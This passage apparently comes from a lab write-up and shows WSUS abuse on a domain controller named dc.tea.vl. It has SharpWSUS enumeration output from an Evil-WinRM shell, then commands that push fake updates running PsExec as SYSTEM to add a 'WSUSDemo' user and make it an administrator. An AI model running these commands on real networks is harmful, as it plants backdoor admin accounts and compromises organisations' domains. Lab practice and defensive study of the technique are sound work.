WSUS is a Microsoft solution for administrators to deploy Microsoft product updates and patches across an environment in a scalable manner, using a method where the internal servers do not need to reach out to the internet directly. WSUS is extremely common within Windows corporate environments.

```bash
*Evil-WinRM* PS C:\windows\tasks> .\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.tea.vl, 10.10.191.5, 10.0.20348.2031, 6/5/2025 12:39:06 PM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete

```



```bash
SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\"" /title:"WSUSDemo1"
SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group1"

SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo2"
SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group2"
```
